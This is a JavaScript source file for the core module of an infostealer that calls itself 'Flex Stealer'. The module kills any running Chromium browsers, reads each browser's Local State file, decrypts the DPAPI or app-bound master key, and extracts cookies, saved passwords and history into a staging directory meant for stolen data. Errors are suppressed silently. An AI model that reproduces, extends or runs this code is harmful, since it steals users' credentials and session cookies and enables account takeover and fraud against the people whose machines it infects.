const fs = require('fs-extra');
const path = require('path');
const { decryptAppBoundKey } = require('./appBoundDecryptor');
const { getLocalStatePath, getBrowserPaths } = require('../browser_utils/paths');
const { extractChromiumData } = require('../browser_utils/chromium_extractor');
const { isProcessRunning, killProcess } = require('../browser_utils/process-manager');

/**
 * Flex Stealer | 2026 - Main Browser App Core
 * Orchestrates data harvesting from Chromium-based browsers.
 */

/**
 * Main routine to scan and extract data from all supported browsers.
 * @param {string} stagingDir - The directory where stolen data should be saved.
 */
async function run(stagingDir) {
    const browsers = getBrowserPaths();
    const results = [];

    for (const browser of browsers) {
        try {
            const localStatePath = getLocalStatePath(browser.name);
            if (!fs.existsSync(localStatePath)) continue;

            // Kill browser process if running to avoid db locks
            if (await isProcessRunning(browser.processName)) {
                await killProcess(browser.processName);
            }

            const localState = await fs.readJson(localStatePath);
            const encryptedKey = localState.os_crypt && localState.os_crypt.encrypted_key;

            if (encryptedKey) {
                // Decrypt the master key (handles both DPAPI and App-Bound)
                const decryptedKey = await decryptAppBoundKey(encryptedKey);
                
                if (decryptedKey) {
                    // Extract cookies, passwords, history, etc.
                    const data = await extractChromiumData(browser, decryptedKey, stagingDir);
                    results.push({ browser: browser.name, ...data });
                }
            }
        } catch (err) {
            // Log error internally in refined version
        }
    }
    return results;
}

module.exports = {
    run
};
